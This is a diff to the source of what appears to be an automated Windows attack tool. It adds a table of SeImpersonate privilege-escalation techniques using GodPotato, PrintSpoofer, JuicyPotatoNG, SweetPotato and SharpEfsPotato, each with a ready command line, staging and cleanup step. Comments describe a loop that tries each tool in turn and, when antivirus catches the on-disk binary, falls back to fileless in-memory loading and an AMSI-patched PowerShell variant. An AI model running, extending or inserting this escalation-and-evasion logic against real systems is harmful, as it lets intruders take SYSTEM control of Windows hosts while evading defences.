@@ -262,21 +262,42 @@ WIN_GROUPS = {
 #: presents; a live catch marks that technique red so the loop won't re-burn it.
 _IMPERSONATION_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"}
 
-WIN_IMPERSONATION = (
-    dict(key="seimpersonate:native", delivery="native-exe", detection="moderate",
-         title="SeImpersonate → SYSTEM (GodPotato, native EXE)",
-         needs="GodPotato.exe staged in {stage}",
-         command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
-         cleanup="del {stage}\\GodPotato.exe",
-         stages=(("GodPotato", "{stage}\\GodPotato.exe"),),
-         detail="token impersonation to SYSTEM via GodPotato — a native PE on disk, no AMSI surface."),
+#: The native Potato *tools* — each a different binary/technique/AV-signature, and each
+#: works on a different span of Windows. All are native-exe delivery, so the loop tries
+#: them in order (a functional miss — wrong OS, spooler off, denied — advances to the next
+#: variant), and an AV catch on the on-disk method climbs to the fileless/script deliveries
+#: below. Each auto-stages its own exe from the arsenal. (name, exe, command, note)
+_POTATOES = (
+    ("godpotato", "GodPotato", '{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
+     "GodPotato (RPC/DCOM, .NET) — broad: Server 2012–2022, Win8–11."),
+    ("printspoofer", "PrintSpoofer", '{stage}\\PrintSpoofer.exe -c "cmd /c whoami"',
+     "PrintSpoofer abuses the Print Spooler named pipe — Server 2016–2019, Win10."),
+    ("juicypotatong", "JuicyPotatoNG",
+     '{stage}\\JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     "JuicyPotatoNG (DCOM) — the modern JuicyPotato successor."),
+    ("sweetpotato", "SweetPotato",
+     '{stage}\\SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     "SweetPotato bundles several coercion techniques — a good fallback."),
+    ("efspotato", "SharpEfsPotato",
+     '{stage}\\SharpEfsPotato.exe -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     "SharpEfsPotato abuses EFSRPC (MS-EFSR) — works where the spooler is disabled."),
+)
+
+WIN_IMPERSONATION = tuple(
+    dict(key=f"seimpersonate:{slug}", delivery="native-exe", detection="moderate",
+         title=f"SeImpersonate → SYSTEM ({tool})",
+         needs=f"{tool}.exe staged in {{stage}}",
+         command=cmd, cleanup=f"del {{stage}}\\{tool}.exe",
+         stages=((tool, f"{{stage}}\\{tool}.exe"),), detail=note)
+    for slug, tool, cmd, note in _POTATOES
+) + (
     dict(key="seimpersonate:inmem", delivery="inmem-fileless", detection="moderate",
          title="SeImpersonate → SYSTEM (in-memory potato)",
          needs="a potato assembly + an in-memory .NET loader staged in {stage}",
          command='{stage}\\loader.exe potato "cmd /c whoami"',
          cleanup=None,
-         detail="same objective loaded reflectively — nothing on disk, but a managed loader "
-                "(AMSI surface). Climb here when the on-disk EXE is caught."),
+         detail="load a potato reflectively — nothing on disk, but a managed loader "
+                "(AMSI surface). Climb here when the on-disk EXEs are caught."),
     dict(key="seimpersonate:ps", delivery="ps-amsi-revshell", detection="loud",
          title="SeImpersonate → SYSTEM (PowerShell potato)",
          needs="an AMSI-patched PowerShell potato in {stage}",
